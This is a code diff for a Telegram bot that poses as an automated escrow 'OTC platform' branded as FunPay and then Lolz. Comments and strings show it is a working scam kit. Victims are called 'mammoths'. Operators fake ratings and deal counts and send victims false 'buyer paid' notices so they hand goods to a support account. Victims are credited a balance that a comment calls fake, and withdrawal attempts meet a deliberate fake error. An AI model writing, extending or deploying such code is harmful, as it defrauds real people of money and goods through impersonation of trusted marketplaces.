@@ -1,5 +1,6 @@
 import logging
 import os
+import sqlite3
 from aiogram import Router, F
 from aiogram.types import Message, CallbackQuery, FSInputFile
 from aiogram.filters import Command
@@ -14,20 +15,21 @@ from config import (
     E_USERS, E_SETTINGS, E_PAID, E_WARNING,
     E_PROFILE, E_WITHDRAW, E_CARD, E_GLOBE,
     E_CHAT, E_BANK, E_SUCCESS, E_GROUP,
-    E_UP, E_DOWN,
+    E_UP, E_DOWN, E_GIFT,
     E_RU, E_US, E_TR
 )
 from database import (
     init_db, add_user, get_user, add_requisite, get_requisites,
     delete_requisites, create_deal, get_deal, update_deal_buyer,
     update_deal_paid, update_deal_confirmed, update_deal_completed,
-    get_user_deals, update_user_successful_deals, get_all_users,
-    get_all_deals, get_deal_count_by_status, get_user_count
+    get_user_deals, update_user_successful_deals, update_user_balance,
+    get_all_users, get_all_deals, get_deal_count_by_status, get_user_count,
+    DB_NAME
 )
 from keyboards import (
     main_menu, admin_panel, currency_selection, requisite_menu,
     deal_actions, deal_status_buttons, deal_paid_buttons,
-    back_button, ok_button, share_deal
+    back_button, ok_button, share_deal, support_button
 )
 from states import DealStates, RequisiteStates
 
@@ -66,6 +68,24 @@ def format_amount(amount):
         return str(int(amount))
     return str(amount)
 
+def get_currency_emoji(currency):
+    if currency == "грам":
+        return E_GRAM
+    elif currency == "карта":
+        return "💳"
+    elif currency == "звезд":
+        return E_GIFT
+    return ""
+
+def get_currency_icon(currency):
+    if currency == "грам":
+        return ICON_GRAM
+    elif currency == "карта":
+        return ICON_CARD
+    elif currency == "звезд":
+        return ICON_STARS
+    return ICON_STARS
+
 async def send_main_menu(message: Message, user_id: int):
     is_admin_user = is_admin(user_id)
 
@@ -74,14 +94,22 @@ async def send_main_menu(message: Message, user_id: int):
             gif = FSInputFile(WELCOME_GIF_PATH)
             await message.answer_animation(
                 animation=gif,
-                caption=f"{E_BANK} <b>FunPay · Официальная OTC-платформа</b>",
+                caption=f"{E_BANK} <b>Lolz · Официальная OTC-платформа</b>\n\n"
+                        f"{E_CHECK} Мы предоставляем полностью автоматизированный сервис гаранта\n"
+                        f"для безопасного обмена цифровыми активами.\n\n"
+                        f"{E_CHECK} <b>Почему выбирают нас?</b>\n"
+                        f"• Средства блокируются в блокчейне — прозрачно и безопасно\n"
+                        f"• Автоматическая проверка оплаты и передачи товара\n"
+                        f"• Система рейтинга покупателей и продавцов\n"
+                        f"• Поддержка 24/7\n\n"
+                        f"{E_CHAT} Поддержка: {SUPPORT_USERNAME}",
                 reply_markup=main_menu(is_admin_user)
             )
             return
         except Exception as e:
             logger.error(f"GIF error: {e}")
 
-    text = f"{E_BANK} <b>FunPay · Официальная OTC-платформа</b>\n\n"
+    text = f"{E_BANK} <b>Lolz · Официальная OTC-платформа</b>\n\n"
     text += f"{E_CHECK} Мы предоставляем полностью автоматизированный сервис гаранта\n"
     text += f"для безопасного обмена цифровыми активами.\n\n"
     text += f"{E_CHECK} <b>Почему выбирают нас?</b>\n"
@@ -92,17 +120,18 @@ async def send_main_menu(message: Message, user_id: int):
     text += f"{E_CHAT} Поддержка: {SUPPORT_USERNAME}"
 
     if is_admin_user:
-        admin_text = f"{E_SETTINGS} <b>Приветствую, воркер!</b>\n\n"
-        admin_text += f"<b>Наши команды:</b>\n"
-        admin_text += f"/buy *код-сделки* – для оплаты сделки\n"
-        admin_text += f"/set_sdel – для установки успешных сделок\n"
-        admin_text += f"/set_ret – для установки рейтинга (в профиле)\n"
-        admin_text += f"/twodeal *юз/айди* – сообщение о второй сделке\n"
-        admin_text += f"/send *текст* *юз/айди* – отправить сообщение\n"
-        admin_text += f"/chat *юз/айди* – выгрузить историю переписки"
-        await message.answer(admin_text, reply_markup=main_menu(is_admin=True))
-    else:
-        await message.answer(text, reply_markup=main_menu(is_admin=False))
+        await message.answer(
+            f"{E_SETTINGS} <b>Приветствую, воркер!</b>\n\n"
+            f"<b>Наши команды:</b>\n"
+            f"/buy *код-сделки* – для оплаты сделки\n"
+            f"/set_sdel – для установки успешных сделок\n"
+            f"/set_ret – для установки рейтинга (в профиле)\n"
+            f"/twodeal *юз/айди* – сообщение о второй сделке\n"
+            f"/send *текст* *юз/айди* – отправить сообщение\n"
+            f"/chat *юз/айди* – выгрузить историю переписки"
+        )
+
+    await message.answer(text, reply_markup=main_menu(is_admin_user))
 
 async def edit_main_menu(callback: CallbackQuery, user_id: int):
     is_admin_user = is_admin(user_id)
@@ -112,7 +141,7 @@ async def edit_main_menu(callback: CallbackQuery, user_id: int):
         await callback.message.delete()
         return
 
-    text = f"{E_BANK} <b>FunPay · Официальная OTC-платформа</b>\n\n"
+    text = f"{E_BANK} <b>Lolz · Официальная OTC-платформа</b>\n\n"
     text += f"{E_CHECK} Мы предоставляем полностью автоматизированный сервис гаранта\n"
     text += f"для безопасного обмена цифровыми активами.\n\n"
     text += f"{E_CHECK} <b>Почему выбирают нас?</b>\n"
@@ -123,17 +152,20 @@ async def edit_main_menu(callback: CallbackQuery, user_id: int):
     text += f"{E_CHAT} Поддержка: {SUPPORT_USERNAME}"
 
     if is_admin_user:
-        admin_text = f"{E_SETTINGS} <b>Приветствую, воркер!</b>\n\n"
-        admin_text += f"<b>Наши команды:</b>\n"
-        admin_text += f"/buy *код-сделки* – для оплаты сделки\n"
-        admin_text += f"/set_sdel – для установки успешных сделок\n"
-        admin_text += f"/set_ret – для установки рейтинга (в профиле)\n"
-        admin_text += f"/twodeal *юз/айди* – сообщение о второй сделке\n"
-        admin_text += f"/send *текст* *юз/айди* – отправить сообщение\n"
-        admin_text += f"/chat *юз/айди* – выгрузить историю переписки"
-        await callback.message.edit_text(admin_text, reply_markup=main_menu(is_admin=True))
+        await callback.message.edit_text(
+            f"{E_SETTINGS} <b>Приветствую, воркер!</b>\n\n"
+            f"<b>Наши команды:</b>\n"
+            f"/buy *код-сделки* – для оплаты сделки\n"
+            f"/set_sdel – для установки успешных сделок\n"
+            f"/set_ret – для установки рейтинга (в профиле)\n"
+            f"/twodeal *юз/айди* – сообщение о второй сделке\n"
+            f"/send *текст* *юз/айди* – отправить сообщение\n"
+            f"/chat *юз/айди* – выгрузить историю переписки"
+        )
     else:
-        await callback.message.edit_text(text, reply_markup=main_menu(is_admin=False))
+        await callback.message.edit_text(text, reply_markup=main_menu(is_admin_user))
+
+# ============ КОМАНДЫ ============
 
 @router.message(Command("start"))
 async def cmd_start(message: Message, state: FSMContext):
@@ -155,24 +187,32 @@ async def cmd_start(message: Message, state: FSMContext):
 
             if deal and deal[6] not in ['paid', 'confirmed', 'completed']:
                 update_deal_buyer(deal_code, user_id)
+                deal = get_deal(deal_code)
+                
+                buyer_id = deal[3]
+                logger.info(f"Buyer ID after update: {buyer_id}")
 
                 reqs = get_requisites(deal[1])
                 req_text = format_requisites(reqs)
-
+                
+                currency_emoji = get_currency_emoji(deal[5])
+                
+                # Сообщение для мамонта (покупателя) после перехода по ссылке
                 await message.answer(
                     f"{E_DEAL} <b>Сделка #{deal_code}</b>\n"
-                    f"<b>Сумма:</b> {format_amount(deal[4])} {deal[5]}\n"
+                    f"<b>Сумма:</b> {format_amount(deal[4])} {currency_emoji}\n"
                     f"<b>Описание:</b> {deal[5]}\n"
                     f"<b>Комиссия:</b> {COMMISSION}%\n\n"
                     f"<b>Реквизиты для оплаты:</b>\n"
                     f"{req_text}\n\n"
                     f"После успешной оплаты статус сделки изменится, и продавец получит уведомление о вашей успешной оплате!",
-                    reply_markup=deal_status_buttons(deal_code, is_seller=False)
+                    reply_markup=support_button()
                 )
 
                 user = get_user(user_id)
                 deals_count = user[3] if user else 0
 
+                # Уведомление продавцу (мамонту) что покупатель присоединился
                 await message.bot.send_message(
                     deal[1],
                     f"{E_WARNING} <b>@{username} ({user_id}) присоединился к сделке #{deal_code}!</b>\n"
@@ -208,19 +248,151 @@ async def cmd_buy(message: Message):
     buyer_id = deal[3]
     buyer = get_user(buyer_id)
     buyer_username = buyer[1] if buyer else "Неизвестно"
+    currency_emoji = get_currency_emoji(deal[5])
 
     await message.answer(
         f"{E_WARNING} <b>Вы уверены что хотите провести оплату по сделке #{deal_code}?</b>\n\n"
-        f"Мамонт: @{buyer_username} ({buyer_id})\n"
-        f"Сумма: {format_amount(deal[4])} {deal[5]}\n"
-        f"Описание: {deal[5]}",
+        f"<b>Мамонт:</b> @{buyer_username} ({buyer_id})\n"
+        f"<b>Сумма:</b> {format_amount(deal[4])} {currency_emoji}\n"
+        f"<b>Описание:</b> {deal[5]}",
         reply_markup=deal_paid_buttons(deal_code)
     )
+
+# ============ КОМАНДЫ ВОРКЕРА ============
+
+@router.message(Command("set_sdel"))
+async def cmd_set_sdel(message: Message):
+    if not is_admin(message.from_user.id):
+        await message.answer(ERROR_MESSAGES["access_denied"])
+        return
+    
+    args = message.text.split()
+    if len(args) < 2:
+        await message.answer(f"{E_CROSS} <b>Используйте: /set_sdel &lt;количество&gt; [юз/айди]</b>")
+        return
+    
+    try:
+        count = int(args[1])
+    except:
+        await message.answer(f"{E_CROSS} <b>Количество должно быть числом</b>")
+        return
+    
+    target = message.from_user.id
+    target_username = "себе"
+    
+    if len(args) > 2:
+        target_arg = args[2]
+        if target_arg.startswith('@'):
+            target_arg = target_arg.replace('@', '')
+            conn = sqlite3.connect(DB_NAME)
+            cur = conn.cursor()
+            cur.execute("SELECT user_id FROM users WHERE username = ?", (target_arg,))
+            result = cur.fetchone()
+            conn.close()
+            if result:
+                target = result[0]
+                target_username = f"@{target_arg}"
+            else:
+                await message.answer(f"{E_CROSS} <b>Пользователь @{target_arg} не найден</b>")
+                return
+        else:
+            try:
+                target = int(target_arg)
+                target_username = str(target)
+            except:
+                await message.answer(f"{E_CROSS} <b>Неверный формат</b>")
+                return
+    
+    conn = sqlite3.connect(DB_NAME)
+    cur = conn.cursor()
+    cur.execute("UPDATE users SET successful_deals = ? WHERE user_id = ?", (count, target))
+    conn.commit()
+    conn.close()
+    
+    await message.answer(f"{E_SUCCESS} <b>Установлено {count} успешных сделок для {target_username}</b>")
+
+@router.message(Command("set_ret"))
+async def cmd_set_ret(message: Message):
+    if not is_admin(message.from_user.id):
+        await message.answer(ERROR_MESSAGES["access_denied"])
+        return
+    
+    args = message.text.split()
+    if len(args) < 2:
+        await message.answer(f"{E_CROSS} <b>Используйте: /set_ret &lt;рейтинг&gt; [юз/айди]</b>")
+        return
+    
+    try:
+        rating = float(args[1].replace(',', '.'))
+        if rating < 0 or rating > 5:
+            await message.answer(f"{E_CROSS} <b>Рейтинг должен быть от 0 до 5</b>")
+            return
+    except:
+        await message.answer(f"{E_CROSS} <b>Рейтинг должен быть числом</b>")
+        return
+    
+    target = message.from_user.id
+    target_username = "себе"
+    
+    if len(args) > 2:
+        target_arg = args[2]
+        if target_arg.startswith('@'):
+            target_arg = target_arg.replace('@', '')
+            conn = sqlite3.connect(DB_NAME)
+            cur = conn.cursor()
+            cur.execute("SELECT user_id FROM users WHERE username = ?", (target_arg,))
+            result = cur.fetchone()
+            conn.close()
+            if result:
+                target = result[0]
+                target_username = f"@{target_arg}"
+            else:
+                await message.answer(f"{E_CROSS} <b>Пользователь @{target_arg} не найден</b>")
+                return
+        else:
+            try:
+                target = int(target_arg)
+                target_username = str(target)
+            except:
+                await message.answer(f"{E_CROSS} <b>Неверный формат</b>")
+                return
+    
+    conn = sqlite3.connect(DB_NAME)
+    cur = conn.cursor()
+    cur.execute("UPDATE users SET rating = ? WHERE user_id = ?", (rating, target))
+    conn.commit()
+    conn.close()
+    
+    await message.answer(f"{E_SUCCESS} <b>Установлен рейтинг {rating} для {target_username}</b>")
+
+@router.message(Command("twodeal"))
+async def cmd_twodeal(message: Message):
+    if not is_admin(message.from_user.id):
+        await message.answer(ERROR_MESSAGES["access_denied"])
+        return
+    await message.answer(f"{E_SUCCESS} <b>Функция в разработке</b>")
+
+@router.message(Command("send"))
+async def cmd_send(message: Message):
+    if not is_admin(message.from_user.id):
+        await message.answer(ERROR_MESSAGES["access_denied"])
+        return
+    await message.answer(f"{E_SUCCESS} <b>Функция в разработке</b>")
+
+@router.message(Command("chat"))
+async def cmd_chat(message: Message):
+    if not is_admin(message.from_user.id):
+        await message.answer(ERROR_MESSAGES["access_denied"])
+        return
+    await message.answer(f"{E_SUCCESS} <b>Функция в разработке</b>")
+
+# ============ КОЛБЭКИ ============
 
 @router.callback_query(F.data == "back_to_main")
 async def back_to_main(callback: CallbackQuery, state: FSMContext):
     await state.clear()
-    await edit_main_menu(callback, callback.from_user.id)
+    await send_main_menu(callback.message, callback.from_user.id)
+    await callback.message.delete()
     await callback.answer()
 
 @router.callback_query(F.data == "admin_panel")
@@ -284,7 +456,8 @@ async def admin_deals(callback: CallbackQuery):
     else:
         text = f"{E_LIST} <b>Последние 10 сделок:</b>\n\n"
         for deal in deals:
-            text += f"#{deal[0]} | {format_amount(deal[4])} {deal[5]} | {deal[6]}\n"
+            currency_emoji = get_currency_emoji(deal[5])
+            text += f"#{deal[0]} | {format_amount(deal[4])} {currency_emoji} | {deal[6]}\n"
 
     if not callback.message.text:
         await callback.message.answer(text, reply_markup=back_button())
@@ -321,26 +494,6 @@ async def admin_users(callback: CallbackQuery):
 
 @router.callback_query(F.data == "create_deal")
 async def create_deal_start(callback: CallbackQuery, state: FSMContext):
-    user_id = callback.from_user.id
-    reqs = get_requisites(user_id)
-
-    if not reqs:
-        if not callback.message.text:
-            await callback.message.answer(
-                ERROR_MESSAGES["no_requisites"],
-                reply_markup=ok_button()
-            )
-            await callback.message.delete()
-            await callback.answer()
-            return
-
-        await callback.message.edit_text(
-            ERROR_MESSAGES["no_requisites"],
-            reply_markup=ok_button()
-        )
-        await callback.answer()
-        return
-
     if not callback.message.text:
         await callback.message.answer(
             f"{E_DEAL} <b>Выберите валюту сделки:</b>",
@@ -362,15 +515,16 @@ async def select_currency(callback: CallbackQuery, state: FSMContext):
     currency = callback.data.replace("currency_", "")
     currency_names = {
         "gram": "грам",
-        "stars": "звезд",
-        "rub": "рублей"
+        "card": "карта",
+        "stars": "звезд"
     }
 
     await state.update_data(currency=currency_names[currency])
+    currency_display = {"gram": "GRAM", "card": "Карта", "stars": "Звёзды"}[currency]
 
     if not callback.message.text:
         await callback.message.answer(
-            f"{E_WARNING} <b>Введите сумму сделки:</b>",
+            f"{E_WARNING} <b>Введите сумму сделки в {currency_display}:</b>",
             reply_markup=back_button()
         )
         await callback.message.delete()
@@ -378,7 +532,7 @@ async def select_currency(callback: CallbackQuery, state: FSMContext):
         return
 
     await callback.message.edit_text(
-        f"{E_WARNING} <b>Введите сумму сделки:</b>",
+        f"{E_WARNING} <b>Введите сумму сделки в {currency_display}:</b>",
         reply_markup=back_button()
     )
     await state.set_state(DealStates.waiting_amount)
@@ -397,9 +551,10 @@ async def process_amount(message: Message, state: FSMContext):
     await state.update_data(amount=amount)
     data = await state.get_data()
     currency = data.get('currency', 'грам')
+    currency_emoji = get_currency_emoji(currency)
 
     await message.answer(
-        f"{E_DEAL} <b>Что вы предлагаете за {format_amount(amount)} {currency}?</b>",
+        f"{E_DEAL} <b>Что вы предлагаете за {format_amount(amount)} {currency_emoji}?</b>",
         reply_markup=back_button()
     )
     await state.set_state(DealStates.waiting_description)
@@ -416,17 +571,30 @@ async def process_description(message: Message, state: FSMContext):
     amount = data.get('amount', 0)
 
     user_id = message.from_user.id
+    
+    # Проверка реквизитов (кроме звёзд)
+    if currency != "звезд":
+        reqs = get_requisites(user_id)
+        if not reqs:
+            await message.answer(
+                f"{E_CROSS} <b>У вас не добавлены реквизиты!</b>\n\n"
+                f"Добавьте реквизиты в меню 'Реквизиты'",
+                reply_markup=back_button()
+            )
+            return
+
     bot_username = (await message.bot.get_me()).username
 
     deal_code = create_deal(user_id, currency, amount, description)
     deal_link = f"https://t.me/{bot_username}?start={deal_code}"
 
     await state.clear()
+    currency_emoji = get_currency_emoji(currency)
 
     await message.answer(
         f"{E_SUCCESS} <b>Сделка создана!</b>\n\n"
         f"<b>Номер сделки:</b> #{deal_code}\n"
-        f"<b>Сумма:</b> {format_amount(amount)} {currency}\n"
+        f"<b>Сумма:</b> {format_amount(amount)} {currency_emoji}\n"
         f"<b>Описание:</b> {description}\n\n"
         f"<b>Ссылка для покупателя:</b>\n{deal_link}\n\n"
         f"Отправьте эту ссылку покупателю для совершения оплаты!",
@@ -444,8 +612,10 @@ async def share_deal_link(callback: CallbackQuery):
             return
         bot_username = (await callback.bot.get_me()).username
         deal_link = f"https://t.me/{bot_username}?start={deal_code}"
+        
+        # Отправляем сообщение для пересылки по чатам
         await callback.message.answer(
-            f"{E_SHARE} <b>Ссылка для покупателя:</b>\n{deal_link}"
+            f"{deal_link}\n\nПо этой ссылке можно перейти на сделку со мной 🤝"
         )
         await callback.answer("✅ Ссылка отправлена!")
         return
@@ -466,8 +636,11 @@ async def share_deal_link(callback: CallbackQuery):
 
 @router.callback_query(F.data.startswith("cancel_deal_"))
 async def cancel_deal(callback: CallbackQuery, state: FSMContext):
-    await back_to_main(callback, state)
-    await callback.answer(f"{E_CROSS} Сделка отменена")
+    await callback.message.answer(
+        f"{E_CROSS} <b>Сделка отменена</b>",
+        reply_markup=back_button()
+    )
+    await callback.answer()
 
 @router.callback_query(F.data == "requisites")
 async def requisites_menu(callback: CallbackQuery):
@@ -555,7 +728,7 @@ async def process_card(message: Message, state: FSMContext):
 
     if not validate_card(card_number):
         await message.answer(
-            f"{E_WARNING} <b>Неверный формат карты!</b>\nВведите 16 цифр",
+            ERROR_MESSAGES["invalid_card"],
             reply_markup=back_button()
         )
         return
@@ -607,6 +780,7 @@ async def profile_callback(callback: CallbackQuery):
     text += f"📝 Имя: {user[2]}\n"
     text += f"{E_SUCCESS} Успешных сделок: {user[3]}\n"
     text += f"⭐ Рейтинг: {user[4]}\n"
+    text += f"💰 Баланс: {user[5]} RUB\n"
     text += f"{E_LIST} Всего сделок: {len(deals)}\n"
     text += f"{E_SUCCESS} Завершено: {len(completed)}"
 
@@ -622,18 +796,23 @@ async def profile_callback(callback: CallbackQuery):
 @router.callback_query(F.data == "withdraw")
 async def withdraw_callback(callback: CallbackQuery):
     user_id = callback.from_user.id
+    user = get_user(user_id)
+    balance = user[5] if user else 0
+
+    # Фейковая ошибка вывода — мамонт не может вывести деньги
+    if user_id not in ADMIN_IDS:
+        await callback.message.edit_text(
+            f"{E_CROSS} <b>Ошибка вывода!</b>\n\n"
+            f"Минимальная сумма для вывода: 1000 RUB\n"
+            f"Ваш баланс: {balance} RUB\n\n"
+            f"Для решения проблемы обратитесь в поддержку: {SUPPORT_USERNAME}",
+            reply_markup=support_button()
+        )
+        await callback.answer()
+        return
+
     reqs = get_requisites(user_id)
-
     if not reqs:
-        if not callback.message.text:
-            await callback.message.answer(
-                f"{E_CROSS} <b>У вас нет реквизитов для вывода!</b>\n\nДобавьте реквизиты в меню 'Реквизиты'",
-                reply_markup=back_button()
-            )
-            await callback.message.delete()
-            await callback.answer()
-            return
-
         await callback.message.edit_text(
             f"{E_CROSS} <b>У вас нет реквизитов для вывода!</b>\n\nДобавьте реквизиты в меню 'Реквизиты'",
             reply_markup=back_button()
@@ -642,16 +821,11 @@ async def withdraw_callback(callback: CallbackQuery):
         return
 
     text = f"{E_WITHDRAW} <b>Вывод средств</b>\n\n"
+    text += f"Ваш баланс: {balance} RUB\n"
     text += "Ваши реквизиты для вывода:\n"
     for req_type, value in reqs:
         text += f"• {req_type.upper()}: {value}\n"
-    text += f"\n{E_CHAT} Для вывода обратитесь в поддержку: {SUPPORT_USERNAME}"
-
-    if not callback.message.text:
-        await callback.message.answer(text, reply_markup=back_button())
-        await callback.message.delete()
-        await callback.answer()
-        return
+    text += f"\n{E_CHAT} Заявка на вывод отправлена! Ожидайте обработки."
 
     await callback.message.edit_text(text, reply_markup=back_button())
     await callback.answer()
@@ -692,6 +866,8 @@ async def language_callback(callback: CallbackQuery):
     await callback.message.edit_text(text, reply_markup=back_button())
     await callback.answer()
 
+# ============ ОПЛАТА ============
+
 @router.callback_query(F.data.startswith("hit_mammoth_"))
 async def hit_mammoth(callback: CallbackQuery):
     if not is_admin(callback.from_user.id):
@@ -705,33 +881,46 @@ async def hit_mammoth(callback: CallbackQuery):
         await callback.answer(ERROR_MESSAGES["deal_not_found"], show_alert=True)
         return
 
+    # Обновляем статус на paid
     update_deal_paid(deal_code)
+    deal = get_deal(deal_code)
+    
+    buyer_id = deal[3]
+    seller_id = deal[1]
+    currency_emoji = get_currency_emoji(deal[5])
+    amount_display = format_amount(deal[4])
 
-    # Скамеру: оплата получена
+    logger.info(f"hit_mammoth: deal={deal_code}, buyer={buyer_id}, seller={seller_id}")
+
+    # ===== СКАМЕРУ =====
+    # 1. Оплата получена
     await callback.message.edit_text(
         f"{E_SUCCESS} <b>Оплата по сделке #{deal_code} успешно получена!</b>\nПродавец получил уведомление"
     )
 
-    # Скамеру: статус
+    # 2. Статус + жди передачи
     await callback.message.answer(
         f"{E_DEAL} <b>Сделка #{deal_code}</b>\n"
-        f"<b>Сумма:</b> {format_amount(deal[4])} {deal[5]}\n"
+        f"<b>Сумма:</b> {amount_display} {currency_emoji}\n"
         f"<b>Описание:</b> {deal[5]}\n"
         f"<b>Комиссия:</b> {COMMISSION}%\n\n"
         f"{E_WARNING} <b>Статус сделки: покупатель успешно оплатил</b>\n\n"
         f"{E_WARNING} Дождитесь, пока продавец передаст товар на аккаунт {SUPPORT_USERNAME}, а затем подтвердите это в боте!"
     )
 
-    # ========== МАМОНТУ: СООБЩЕНИЕ КАК НА СКРИНЕ ==========
-    buyer_id = deal[3]
+    # ===== МАМОНТУ =====
     if buyer_id:
         try:
             await callback.bot.send_message(
                 buyer_id,
+                f"{E_DEAL} <b>Сделка #{deal_code}</b>\n"
+                f"<b>Сумма:</b> {amount_display} {currency_emoji}\n"
+                f"<b>Описание:</b> {deal[5]}\n"
+                f"<b>Комиссия:</b> {COMMISSION}%\n\n"
                 f"{E_WARNING} <b>Статус сделки: покупатель успешно оплатил</b>\n"
-                f"{E_DEAL} <b>ПЕРЕДАВАЙТЕ ТОВАР ТОЛЬКО</b> {E_DEAL}\n"
+                f"{E_DOWN} <b>ПЕРЕДАВАЙТЕ ТОВАР ТОЛЬКО</b> {E_DOWN}\n"
                 f"{E_WARNING} {SUPPORT_USERNAME}\n"
-                f"{E_DEAL} <b>ПЕРЕДАВАЙТЕ ТОВАР ТОЛЬКО</b>\n\n"
+                f"{E_UP} <b>ПЕРЕДАВАЙТЕ ТОВАР ТОЛЬКО</b> {E_UP}\n\n"
                 f"В противном случае покупатель не сможет подтвердить получение товара, а вы не сможете получить оплату.\n"
                 f"Рекомендуем записывать экран во время передачи товара, чтобы поддержка могла лучше разобраться в ситуации при необходимости.",
                 reply_markup=deal_status_buttons(deal_code, is_seller=True)
@@ -741,9 +930,10 @@ async def hit_mammoth(callback: CallbackQuery):
 
     await callback.answer(f"{E_SUCCESS} Оплата подтверждена!")
 
+# ============ ПОДТВЕРЖДЕНИЕ ПЕРЕДАЧИ (МАМОНТ) ============
+
 @router.callback_query(F.data.startswith("confirm_deal_"))
 async def confirm_deal(callback: CallbackQuery):
-    """Мамонт подтверждает передачу"""
     deal_code = callback.data.replace("confirm_deal_", "")
     deal = get_deal(deal_code)
 
@@ -752,35 +942,44 @@ async def confirm_deal(callback: CallbackQuery):
         return
 
     update_deal_confirmed(deal_code)
+    deal = get_deal(deal_code)
+    
+    buyer_id = deal[3]
+    seller_id = deal[1]
+    currency_emoji = get_currency_emoji(deal[5])
+    amount_display = format_amount(deal[4])
 
-    # Мамонту: жди проверки (как на скрине IMG_1350)
+    # ===== МАМОНТУ: жди проверки =====
     await callback.message.edit_text(
         f"{E_DEAL} <b>Сделка #{deal_code}</b>\n"
-        f"<b>Сумма:</b> {format_amount(deal[4])} {deal[5]}\n"
+        f"<b>Сумма:</b> {amount_display} {currency_emoji}\n"
         f"<b>Описание:</b> {deal[5]}\n"
         f"<b>Комиссия:</b> {COMMISSION}%\n\n"
         f"<b>Статус сделки: покупатель успешно оплатил, продавец подтвердил передачу товара</b>\n\n"
-        f"Ожидайте проверки покупателем и подтверждения перевода на аккаунт {SUPPORT_USERNAME}. Если товар не был передан на {SUPPORT_USERNAME}, покупатель не сможет подтвердить получение, а вы не получите оплату!",
-        reply_markup=deal_status_buttons(deal_code, is_seller=False)
+        f"Ожидайте проверки покупателем и подтверждения перевода на аккаунт {SUPPORT_USERNAME}.\n"
+        f"Если товар не был передан на {SUPPORT_USERNAME}, покупатель не сможет подтвердить получение, а вы не получите оплату!",
+        reply_markup=support_button()
     )
 
-    # Скамеру: проверь передачу
+    # ===== СКАМЕРУ: проверь передачу =====
     await callback.bot.send_message(
         SCAMMER_ID,
         f"{E_DEAL} <b>Сделка #{deal_code}</b>\n"
-        f"<b>Сумма:</b> {format_amount(deal[4])} {deal[5]}\n"
+        f"<b>Сумма:</b> {amount_display} {currency_emoji}\n"
         f"<b>Описание:</b> {deal[5]}\n"
         f"<b>Комиссия:</b> {COMMISSION}%\n\n"
         f"<b>Статус сделки: покупатель оплатил, продавец подтвердил передачу товара</b>\n\n"
-        f"Проверьте передачу товара на {SUPPORT_USERNAME} и подтвердите это в системе бота. После подтверждения оплата будет безвозвратно отправлена продавцу, а товар — отправлен вам!",
+        f"Проверьте передачу товара на {SUPPORT_USERNAME} и подтвердите это в системе бота.\n"
+        f"После подтверждения оплата будет безвозвратно отправлена продавцу, а товар — отправлен вам!",
         reply_markup=deal_status_buttons(deal_code, is_seller=True)
     )
 
     await callback.answer()
 
+# ============ ПОДТВЕРЖДЕНИЕ ПЕРЕДАЧИ (СКАМЕР) ============
+
 @router.callback_query(F.data.startswith("confirm_deal_seller_"))
 async def confirm_deal_seller(callback: CallbackQuery):
-    """Скамер подтверждает передачу и завершает сделку"""
     if not is_admin(callback.from_user.id):
         await callback.answer(ERROR_MESSAGES["access_denied"], show_alert=True)
         return
@@ -793,29 +992,36 @@ async def confirm_deal_seller(callback: CallbackQuery):
         return
 
     update_deal_completed(deal_code)
-    update_user_successful_deals(deal[1])
-    if deal[3]:
-        update_user_successful_deals(deal[3])
-
+    deal = get_deal(deal_code)
+    
     buyer_id = deal[3]
+    seller_id = deal[1]
+    currency_emoji = get_currency_emoji(deal[5])
+    amount_display = format_amount(deal[4])
 
-    # Скамеру: сделка завершена
+    # Начисляем деньги на фейк-баланс продавцу (мамонту) — но он не сможет вывести!
+    update_user_balance(seller_id, deal[4])
+    update_user_successful_deals(seller_id)
+    if buyer_id:
+        update_user_successful_deals(buyer_id)
+
+    # ===== СКАМЕРУ: сделка завершена =====
     await callback.message.edit_text(
         f"{E_DEAL} <b>Сделка #{deal_code}</b>\n"
-        f"<b>Сумма:</b> {format_amount(deal[4])} {deal[5]}\n"
+        f"<b>Сумма:</b> {amount_display} {currency_emoji}\n"
         f"<b>Описание:</b> {deal[5]}\n"
         f"<b>Комиссия:</b> {COMMISSION}%\n\n"
         f"{E_PAID} <b>Статус сделки: СДЕЛКА УСПЕШНО ЗАВЕРШЕНА</b>\n\n"
         f"{E_SUCCESS} Пожалуйста, дождитесь поступления товара на ваш аккаунт!"
     )
 
-    # Мамонту: ожидай оплату
+    # ===== МАМОНТУ: ожидай оплату =====
     if buyer_id:
         try:
             await callback.bot.send_message(
                 buyer_id,
                 f"{E_DEAL} <b>Сделка #{deal_code}</b>\n"
-                f"<b>Сумма:</b> {format_amount(deal[4])} {deal[5]}\n"
+                f"<b>Сумма:</b> {amount_display} {currency_emoji}\n"
                 f"<b>Описание:</b> {deal[5]}\n"
                 f"<b>Комиссия:</b> {COMMISSION}%\n\n"
                 f"{E_PAID} <b>Статус сделки: СДЕЛКА УСПЕШНО ЗАВЕРШЕНА</b>\n\n"
@@ -825,6 +1031,8 @@ async def confirm_deal_seller(callback: CallbackQuery):
             pass
 
     await callback.answer(f"{E_SUCCESS} Сделка завершена!")
+
+# ============ ОБРАБОТЧИКИ НЕИЗВЕСТНЫХ ============
 
 @router.callback_query()
 async def catch_all_callbacks(callback: CallbackQuery):
